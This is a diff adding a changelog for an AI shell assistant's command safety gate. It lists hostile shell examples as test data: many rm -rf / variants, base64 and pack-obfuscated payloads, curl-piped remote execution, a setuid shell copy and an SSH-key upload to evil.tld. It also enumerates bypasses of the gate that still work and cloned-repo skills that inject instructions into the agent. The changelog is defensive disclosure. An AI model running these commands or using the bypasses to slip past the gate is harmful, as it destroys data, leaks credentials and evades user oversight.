@@ -6,6 +6,284 @@ breaking changes can land in any release.
 
 ## [Unreleased]
 
+### Added
+- **`AISHE_CONFIG_DIR` and `AISHE_DATA_DIR`** override the config and state
+  directories on every platform. The `dirs` crate follows the platform
+  convention and deliberately ignores `XDG_CONFIG_HOME`/`XDG_DATA_HOME` on
+  macOS, so an integration test could not isolate itself there — it read the
+  developer's real config and failed on whichever provider they happened to
+  use. These variables make the suite hermetic everywhere and let anyone
+  relocate the directories.
+
+### Fixed
+- **The test suite no longer depends on the host machine.** Eleven tests failed
+  on macOS for two reasons, both in the tests rather than the shipped code:
+  ten read the developer's real config (see above), and
+  `natural_language_routes_to_nl` asserted that `what …` routes to the model —
+  but `what` is a real command on macOS (`/usr/bin/what`, from SCCS), so
+  routing it to the shell was correct. It now uses `whats`, the README's own
+  example, which ships nowhere.
+
+### Changed
+- **`aishe suggest --json` can now report `"risk": "unknown"`.** The field's
+  existing values (`safe`, `dangerous`, `n/a`) and the exit-code contract
+  (`0`/`20`/`1`) are unchanged: an unknown-risk command exits `20`, the same as a
+  dangerous one, because `20` already means "flagged — do not auto-run, pre-fill
+  for review". Consumers that test `risk == "safe"` therefore keep failing closed
+  without any change.
+- **Custom commands: project commands no longer silently overwrite same-named
+  user commands.** Command loading is now user-first with `or_insert`, so a
+  project command (`<cwd>/.aishe/commands/*.md`) can no longer shadow a
+  same-named user command (`~/.config/aishe/commands/*.md`) — the user's own
+  command always wins. Previously a cloned repo's project command could override
+  a user command by name.
+
+### Security
+- **Safety gate: it now fails closed on a segment whose head it cannot resolve.**
+  `assess` gained a third verdict, `Risk::Unknown(reason)`, returned when a
+  segment's command name is not knowable without running the line — the head is a
+  computed expansion (`$(which rm) -rf /`, `` `which rm` -rf / ``,
+  `${RM:-rm} -rf /`), a leftover option flag (`-rf /etc`), a bare redirection
+  token, or a fragment that cannot be a command name at all. All of those
+  previously returned `Safe` and ran with no prompt. Unknown confirms in auto/yolo
+  (a milder yellow "could not verify" panel, satisfiable with `y/N` rather than
+  typing `yes`), is never re-run for diagnostics (`fix.rs`), and is skipped by
+  `runbook --replay`. It is *narrow* by construction: it means "I could not
+  resolve the head", **not** "this command is not on a denylist" — every
+  well-formed command name, including ones the gate has never heard of (`uv`,
+  `bun`, `mise`, `g++`, `docker-compose`, `./scripts/deploy.sh`), stays `Safe`,
+  and so does ordinary shell syntax (see *Fixed*, below).
+
+- **Scope of the gate changes below — read this before trusting them.** These
+  fixes close specific, enumerated bypasses; they do not make the gate sound. It
+  is still a heuristic denylist of command names and wrapper words matched with
+  regexes over a normalized string, not a shell parser, and it remains bypassable.
+  A command whose head resolves to a well-formed name the denylist doesn't know is
+  still `Safe`. Failing closed on an unresolvable head narrows the hole, it does
+  not close it: an attacker who can choose the spelling can pick a resolvable one.
+  The gate is a heuristic speed bump against mistakes, not a security boundary and
+  not an authoritative verdict. For autonomous or untrusted use, raise
+  `yolo_confirm` and/or use `sandbox_backend = "bwrap"` (or `aishe dry-run`),
+  which is the real control.
+
+  Measured residual as of this release — each of these was run through `assess`
+  and is **not** flagged `Dangerous`:
+  - **Runners outside the capped table** (see below) hide their payload
+    completely: `cargo run -- rm -rf /`, `mise exec -- rm -rf /`,
+    `asdf exec rm -rf /`, `conda run rm -rf /`, `pixi run rm -rf /`,
+    `devbox run rm -rf /`, `lxc exec ctr -- rm -rf /`, `systemd-run rm -rf /`,
+    `deno task nuke`, `bun run nuke`, `just`/`make`/`rake`/`gradle` targets — all
+    `Safe`.
+  - **Opaque pipe sources** into a shell are `Unknown`, not `Dangerous`:
+    `cat deploy.sh | sh`, `base64 -d payload.b64 | bash`,
+    `gpg -d payload.gpg | bash`, `aws s3 cp s3://b/k - | bash`. The gate cannot
+    know what the left side emits until it runs, so it prompts rather than
+    judging.
+  - **Obfuscated interpreter payloads** defeat the substring scan:
+    `python3 -c "exec(__import__('base64').b64decode('cm0gLXJmIC8='))"`,
+    `perl -e 'system(pack("H*","726d202d7266202f"))'`,
+    `php -r 'system(strrev("/ fr- mr"));'`, `awk 'BEGIN{system("rm -rf /")}'` —
+    all `Safe`. Only *literal* destructive text in the payload is caught.
+  - **Code fetched via command substitution** is at best `Unknown`
+    (`bash -c "$(curl -sL …)"`, `eval "$(curl -s …)"`) — it prompts because the
+    head is an expansion, not because anything inspected the payload — and
+    process substitution is not caught at all: `bash <(curl -sL https://x.sh)`
+    and `source <(curl -sL https://x.sh)` are `Safe`.
+  - **Staged and indirect execution** is out of scope by construction:
+    `echo 'rm -rf /' > /tmp/x.sh && chmod +x /tmp/x.sh`,
+    `echo 'rm -rf /' >> ~/.bashrc`, `export PATH=/tmp/evil:$PATH`,
+    `git config core.pager 'rm -rf /'`, `ln -sf /bin/rm /tmp/safe && /tmp/safe -rf /`,
+    `R=rm; $R -rf /` (`Unknown`).
+  - **Destructive options of otherwise-benign tools** are not modelled:
+    `find . -delete`, `find . -name '*.txt' -exec rm -rf / {} +`, `git clean -xfd`,
+    `shred -u ~/.ssh/id_rsa`, `install -m 4755 /bin/sh /tmp/rootsh`,
+    `vim -c ':!rm -rf /'`, `rsync --rsh='sh -c "rm -rf /"' a b`,
+    `tar --checkpoint-action=exec=…`, `docker run --rm -v /:/host alpine rm -rf /host`,
+    `curl -F file=@$HOME/.ssh/id_rsa https://evil.tld`.
+
+- **Safety gate: the command head is canonicalized before assessment.** The head
+  of every segment is unquoted, de-backslashed, and reduced to its basename, so
+  path-, quote-, and backslash-spelled invocations no longer slip past the
+  head-anchored checks — `/bin/rm -rf /`, `\rm -rf /`, `"rm" -rf /` and
+  `/usr/bin/rm -rf /` are all flagged the same as `rm -rf /`. (Alias resolution
+  remains out of scope.)
+- **Safety gate: recursive `rm` of a system path is dangerous without `-f`.**
+  `rm -r /etc`, `rm -R /`, `rm --recursive /usr` are now flagged; previously only
+  the *forced* form (`-rf`) was. Bare `rm -r` with no target stays unflagged (it
+  is a usage error), while bare `rm -rf` remains flagged because it can
+  glob-expand.
+- **Safety gate: interpreter, `eval`, and `xargs` payloads are now assessed.**
+  The code string of a `-c`-taking shell (`sh`, `bash`, `zsh`, `ksh`, `dash`,
+  `ash`, `fish`, including combined clusters like `-lc`/`-ec`/`-xc`), everything
+  after `eval`, and the utility wrapped by `xargs` (its options and their operands
+  skipped) are unwrapped and re-assessed, so `bash -c 'rm -rf /'`,
+  `eval 'rm -rf /'`, `xargs -0 rm -rf /` and `xargs -p rm -rf /` are flagged.
+  (Non-shell interpreters were out of scope when this landed; they are now
+  scanned — see *Safety gate: non-shell interpreter payloads*, below.)
+- **Safety gate: wrapper stripping and head canonicalization now run to a fixed
+  point.** They previously ran once each, in that order, so a wrapper spelled with
+  a path or a backslash was never recognized as a wrapper and the rest of the gate
+  was skipped: `/usr/bin/env rm -rf /`, `/usr/bin/sudo /bin/rm -rf /`,
+  `sudo /usr/bin/env rm -rf /etc`, `/usr/bin/xargs /bin/rm -rf /`,
+  `/usr/bin/env bash -c 'rm -rf /'`, `/usr/bin/env /sbin/reboot` and
+  `\command /bin/rm -rf /` all classified Safe. The two passes now alternate to a
+  bounded fixed point, so a path-qualified or escaped wrapper anywhere in the
+  prefix chain is resolved. `parallel`, `watch`, `flock`, `stdbuf`, `chroot`,
+  `script` and `busybox` are recognized as exec wrappers, `command`/`exec`/`nohup`
+  consume their own options, `xargs` handles its long forms, compound-statement
+  keywords (`do`, `then`, `else`, `{`, `!`) are stripped, and newlines are kept as
+  segment boundaries — so `parallel rm -rf /`, `flock /tmp/lock rm -rf /`,
+  `ls\nrm -rf /` and `for f in *; do rm -rf /; done` are flagged.
+- **Safety gate: more interpreter payload spellings are assessed.** A `-c` cluster
+  now counts when `c` appears anywhere in it (`bash -cx '…'`, not just `-lc`/`-ec`),
+  leading flags and `--` after `-c` are skipped (`bash -c -- 'rm -rf /'`),
+  `su -c`/`runuser -c`/`script -c`/`busybox sh -c` are treated as code-running
+  interpreters, `fish --command` is recognized, and a here-string operand
+  (`bash <<< 'rm -rf /'`) is assessed like a here-doc body. `rm`'s long options are
+  matched by unambiguous prefix as GNU getopt accepts them, so `rm --recu /etc`,
+  `--rec`, `--r` are flagged.
+
+- **Safety gate: here-doc bodies are delimited correctly, and a trailing comment
+  can no longer leak a quote.** The here-doc opener scan did not understand
+  comments, so a `<<WORD` appearing inside a `#` comment started a body that
+  swallowed the real commands after it; and an unbalanced quote inside a trailing
+  comment (`echo "a" # don't`) leaked into the tokenizer and corrupted the rest of
+  the segment. Comments are now stripped quote-aware before the opener scan, so
+  `ls # rm -rf /` stays `Safe` while a genuine `bash <<'EOF' … rm -rf / … EOF`
+  body is still assessed and flagged.
+- **Safety gate: redirect targets are checked anywhere in a segment, not just at
+  its head.** A write to a system path was only noticed when the redirection led
+  the segment, so `echo x > /etc/passwd` and `cmd 2>&1 >> /etc/sudoers` passed. Any
+  `>`/`>>` target in the segment is now judged, and `tee` is treated as a writer of
+  its operands — so `tee /etc/passwd` and `echo x | tee /etc/sudoers` are flagged.
+- **Safety gate: `ssh [opts] host <cmd>` assesses the remote command.** The
+  option-and-operand grammar (`-p`, `-i`, `-o`, `-l`, `user@host`, …) is walked so
+  the remaining words are re-assessed as a command line: `ssh host 'rm -rf /'` and
+  `ssh -p 22 -i k user@host rm -rf /` are flagged. This judges the *text being
+  sent*; it says nothing about what the far end actually does with it.
+- **Safety gate: `trap`, `alias` and `watch` quoted code is assessed.** All three
+  take a shell-code string that is executed later, and all three previously hid it:
+  `trap 'rm -rf /' EXIT`, `alias nuke='rm -rf /'` and `watch 'rm -rf /tmp/cache'`
+  are now flagged.
+- **Safety gate: a pipeline whose sink is a shell is judged by its source.** When
+  the last stage is `sh`/`bash`/`zsh`/…, the upstream is examined: if it emits
+  *literal* text the gate can read (`echo 'rm -rf /' | bash`), that text is
+  assessed and the pipeline inherits the verdict; if the upstream is opaque
+  (`cat deploy.sh | sh`, `base64 -d p.b64 | bash`) the result is
+  `Risk::Unknown("a shell executes this pipeline's stdin")` so it fails closed
+  instead of returning `Safe`. The pre-existing `curl … | bash` rule still fires
+  with its own reason. Note the asymmetry: opaque sources prompt, they are not
+  blocked.
+- **Safety gate: non-shell interpreter payloads are scanned.** The code string of
+  `python`/`python3`/`perl`/`node`/`ruby`/`php` (`-c`, `-e`, `-r`) is searched for
+  a destructive shell-out, so `python3 -c "import os; os.system('rm -rf /')"`,
+  `perl -e 'system("rm -rf /")'`, `node -e "…execSync('rm -rf /')"` and
+  `ruby -e 'system("rm -rf /")'` are flagged. **This is a substring scan, not a
+  parser for six languages.** Any payload that constructs the command rather than
+  spelling it out — base64, `pack`, `strrev`, string concatenation — is *not*
+  caught, and `awk 'BEGIN{system("rm -rf /")}'` is not covered at all. See the
+  measured residual above.
+- **Safety gate: a capped table of runner binaries is unwrapped.** `uv run`,
+  `poetry run`, `pipenv run`, `rye run`, `pdm run`, `hatch run`, `bundle exec`,
+  `npm exec`, `pnpm exec`, `yarn exec`, `npx`, `docker exec`, `kubectl exec`,
+  `nix-shell --run` and `direnv exec` now expose the command they wrap, so
+  `uv run rm -rf /` and `kubectl exec pod -- rm -rf /` are flagged. `npm`/`pnpm`/
+  `yarn` **`run`** is deliberately *not* unwrapped: its operand is a `package.json`
+  script name, not a command line, and the gate cannot see the script's body.
+  **This table is deliberately incomplete and will not converge** — there is always
+  another `foo exec`. It covers the dozen a developer actually types; everything
+  else (`cargo run --`, `mise exec`, `conda run`, `just`, `make`, …) still hides
+  its payload. The sandbox, not this list, is the control over what a wrapped
+  command can reach.
+- **`shell:true` custom commands from a project directory are now gated.** A
+  project-origin `shell:true` command must be trusted (`aishe trust <file>`) or
+  explicitly confirmed — the resolved shell command is shown first — before it
+  runs, and the resolved body passes through the standard safety gate. User-origin
+  commands still run without friction. The preview escapes control characters, so
+  a body cannot repaint the line to show a command other than the one that runs.
+- **Custom commands: an untrusted project `mode:` can no longer escalate.** Only
+  `shell: true` bodies were gated; a cloned repo's `mode: yolo` frontmatter took
+  the other branch straight into the agentic loop with no trust prompt, and
+  `mode: auto` was the same escalation one notch weaker. An untrusted project
+  command's `mode:` is now ignored when it ranks above the user's configured mode
+  (a notice is printed); de-escalation, and any user-authored override, are still
+  honored.
+- **Skills: a project skill can no longer shadow a user skill, and is trust-gated.**
+  A skill body is fed to the model verbatim as instructions, and project skills
+  (`<cwd>/.aishe/skills/`) ride along in any cloned repository — yet they
+  previously overrode same-named user skills by load order and were loaded with no
+  trust check at all. Loading is now user-first with `or_insert` (the user's own
+  definition always wins), and a project skill whose file is not trusted
+  (`aishe trust <file>`) is dropped from the registry entirely: not listed, not in
+  the catalog, not loadable via `use_skill`. The gate is at load rather than at
+  use because the model pulls a skill in mid-loop, where there is no user-facing
+  moment to confirm at. Dropped files are reported so the user can trust them
+  deliberately.
+
+### Fixed
+- **Safety gate: shell syntax no longer prompts.** Failing closed on an
+  unresolvable head, as first written, returned `Unknown` for 22% of everyday
+  developer commands — at that rate the confirmation becomes reflexive and the
+  gate is worth nothing. Heads that are shell *syntax* rather than command names
+  are now recognized as resolved and stay `Safe`: test brackets
+  (`[ -f Cargo.toml ] && cargo build`, `[[ -z "$CI" ]] && npm test`), dot-source
+  (`. venv/bin/activate`), `:`, brace groups (`{ echo a; echo b; }`), function
+  headers (`deploy() { … }`), `case` arm labels and the `;;`/`esac`/`fi`/`done`
+  terminators, bare assignments (`VERSION=1.2.3`), comment and shebang lines,
+  option-only wrappers (`env`, `sudo -v`), `exec 3>&1`, a leading redirect with
+  the command after it (`< input.txt sort`), a `$VAR`/`"$SHELL"` head, and a
+  trailing `;`. Three more shapes were `Unknown` only because the tokenizer lost
+  the real head; they now resolve to the *correct* verdict instead of a prompt — a
+  quoted env value containing a space (`CFLAGS="-O2 -Wall" make` Safe,
+  `LDFLAGS="-L/usr/lib -lm" rm -rf /` Dangerous), a leading redirect judged by its
+  target (`> build.log` Safe, `> /etc/passwd` and `2>/dev/null rm -rf /etc`
+  Dangerous), and `watch`'s interval operand (`watch -n 5 kubectl get pods` Safe,
+  `watch -n 5 rm -rf /tmp/cache` Dangerous). `env -S`/`--split-string` is also now
+  unwrapped as a command line. None of this makes the syntax a hiding place:
+  `{ echo a; rm -rf /; }`, `case $1 in start) rm -rf / ;; esac` and a dangerous
+  line following a comment line are still flagged, and no `Dangerous` verdict in
+  the safety corpus was downgraded.
+- **Safety gate: six families of everyday false positives.** `chmod`/`chown`/
+  `chgrp` no longer treat the mode or owner operand as a path (`chown -R $USER
+  ~/.npm` — npm's own documented EACCES remedy — and `chmod -R 755 ~/bin` were
+  flagged on `$USER`/`755`); `$PWD/…`, `${PWD}/…`, `$OLDPWD/…` and `$TMPDIR/…`
+  are in-tree/scratch by definition, so `rm -rf "$PWD/build"` is allowed while
+  `$HOME`/`~` stay dangerous (the rule is per-variable); `/tmp/x` and `/var/tmp/x`
+  are user scratch for `mv`/`dd`/`truncate` (bare `/tmp` still is not); an
+  ordinary non-dot path under `$HOME` can be moved (`mv ~/Downloads/report.pdf
+  ./docs/`) while `~/.config`, `~/.ssh` cannot; and a recursive permission change
+  anywhere under the user's home — dot-dirs included — is theirs to make.
+- **Safety gate: `env -u NAME <cmd>` no longer hides `<cmd>`.** `-u`/`--unset`
+  did not consume its operand, so the variable name became the segment head and
+  `env -u LD_PRELOAD rm -rf /` classified as `Safe`.
+- **Command output is no longer truncated or stalled by non-UTF-8 bytes.** The
+  stdout/stderr drainer reads raw bytes and decodes each line lossily; previously
+  the UTF-8-only line iterator treated the first invalid-UTF-8 line as EOF, which
+  dropped the rest of the output and could fabricate a timeout. The same
+  byte-oriented, lossy read is now used by the MCP stdio transport and the
+  provider SSE stream readers, which had the identical bug: a single invalid byte
+  in a tool result or a streamed token ended the read early and looked like a
+  closed connection.
+- **Captured command output is bounded while it is being read.** Output
+  truncation only ran *after* the stream ended, so a command that produced
+  unbounded output (`yes`, `cat /dev/urandom`) grew the capture buffer until the
+  process died. The drainer now keeps a bounded FIFO tail — a byte budget, a
+  per-line ceiling so one enormous line cannot grow a single allocation without
+  limit, and a line-count cap so a flood of *blank* lines cannot cost a quarter-
+  million `String` allocations inside the byte budget — and records that eviction
+  happened, so the joined text says it was truncated rather than silently
+  presenting a tail as the whole. All three limits sit far above what survives the
+  existing post-run truncation, so no sane command's reported output changes.
+- **Shell probing at startup no longer deadlocks on a chatty `.zshrc`.** The
+  builtin/alias probe polled `try_wait()` and only collected output after exit.
+  An OS pipe buffer is ~64 KiB, so a plugin-heavy shell profile that printed more
+  than that blocked in `write(2)` forever, the child never exited, and the timeout
+  killed a probe that had already produced its answer — leaving the session with
+  no aliases or builtins. Stdout is now drained concurrently on its own thread,
+  discarding past a cap so the child still reaches EOF, with a bounded join so a
+  forked grandchild holding the write end open cannot hang startup. A genuinely
+  hung child is still killed and still reported as a failure.
+
 ## [0.2.24] - 2026-06-13
 
 ### Added
